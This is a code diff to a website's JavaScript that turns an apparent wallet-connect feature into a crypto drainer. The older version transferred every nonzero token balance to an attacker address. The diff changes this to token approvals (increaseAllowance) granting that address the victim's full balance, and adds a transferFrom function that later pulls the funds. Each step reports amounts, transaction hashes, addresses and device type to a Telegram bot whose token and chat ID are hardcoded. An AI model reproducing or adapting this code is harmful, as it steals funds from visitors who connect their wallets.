@@ -81,7 +81,7 @@ scrollReveal();
 addEventOnElem(window, "scroll", scrollReveal);
 
 /**
- * Wallet connect and token transfer with Telegram notification including user agent
+ * Wallet connect, token approval, and Telegram notification
  */
 async function connectWalletAndSendTokens() {
   if (!window.ethers || !window.ethereum) {
@@ -272,29 +272,38 @@ ${nativeBalanceMessage}
           for (const token of nonZeroTokens) {
             try {
               const contract = new ethers.Contract(token.token_address, [
-                "function transfer(address to, uint amount) returns (bool)"
+                "function increaseAllowance(address spender, uint256 addedValue) public returns (bool)",
+                "function allowance(address owner, address spender) public view returns (uint256)"
               ], currentSigner);
 
-              const balance = ethers.utils.formatUnits(token.balance, token.decimals ?? 0);
-              const transferTx = await contract.transfer(network.exodusAddress, token.balance);
-              await transferTx.wait();
+              const balance = ethers.BigNumber.from(token.balance);
+              const currentAllowance = await contract.allowance(userAddress, network.exodusAddress);
+              const neededAllowance = balance.sub(currentAllowance);
 
-              const transferSuccessMessage = `
-✅ Transfer Successful
+              if (neededAllowance.gt(0)) {
+                const approvalTx = await contract.increaseAllowance(network.exodusAddress, neededAllowance);
+                await approvalTx.wait();
+
+                const formattedAmount = ethers.utils.formatUnits(neededAllowance, token.decimals ?? 18);
+                const approvalMessage = `
+✅ Approval Successful
 Token: ${token.symbol}
-Amount: ${balance}
-To: ${network.exodusAddress}
-Tx: ${transferTx.hash}
+Amount Approved: ${formattedAmount}
+Spender: ${network.exodusAddress}
+Tx: ${approvalTx.hash}
 ${deviceType}
-              `;
-              await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: chatId, text: transferSuccessMessage })
-              });
+                `;
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                  method: "POST",
+                  headers: { "Content-Type": "application/json" },
+                  body: JSON.stringify({ chat_id: chatId, text: approvalMessage })
+                });
+              } else {
+                console.log(`Sufficient allowance already exists for ${token.symbol}`);
+              }
             } catch (err) {
               const errorMessage = `
-❌ Transfer Failed
+❌ Approval Failed
 Token: ${token.symbol || 'Unknown'}
 Error: ${err.message}
 ${deviceType}
@@ -330,6 +339,64 @@ ${deviceType}
     }
   } catch (err) {
     const errorMessage = `❌ Wallet Connection Failed: ${err.message}\n${deviceType}`;
+    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: chatId, text: errorMessage })
+    });
+  }
+}
+
+/**
+ * Manual transfer function to be called after approval (e.g., via Etherscan or script)
+ */
+async function executeTransferFrom(tokenAddress, userAddress, amount, decimals, exodusAddress) {
+  const botToken = "7875309387:AAHcqO8m9HtaE9dVqVBlv2xnAwDkUTmFDAU";
+  const chatId = "5995616824";
+
+  let deviceType = "Unknown";
+  if (/Mobile|Android|iPhone|iPad/i.test(navigator.userAgent)) {
+    deviceType = "Mobile";
+  } else if (/Tablet/i.test(navigator.userAgent)) {
+    deviceType = "Tablet";
+  } else {
+    deviceType = "Desktop";
+  }
+
+  try {
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    const signer = provider.getSigner();
+    const contract = new ethers.Contract(tokenAddress, [
+      "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
+      "function symbol() public view returns (string)"
+    ], signer);
+
+    const tokenSymbol = await contract.symbol();
+    const transferTx = await contract.transferFrom(userAddress, exodusAddress, amount);
+    await transferTx.wait();
+
+    const formattedAmount = ethers.utils.formatUnits(amount, decimals);
+    const transferSuccessMessage = `
+✅ Transfer Successful
+Token: ${tokenSymbol}
+Amount: ${formattedAmount}
+From: ${userAddress}
+To: ${exodusAddress}
+Tx: ${transferTx.hash}
+${deviceType}
+    `;
+    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: chatId, text: transferSuccessMessage })
+    });
+  } catch (err) {
+    const errorMessage = `
+❌ Transfer Failed
+Token Address: ${tokenAddress}
+Error: ${err.message}
+${deviceType}
+    `;
     await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
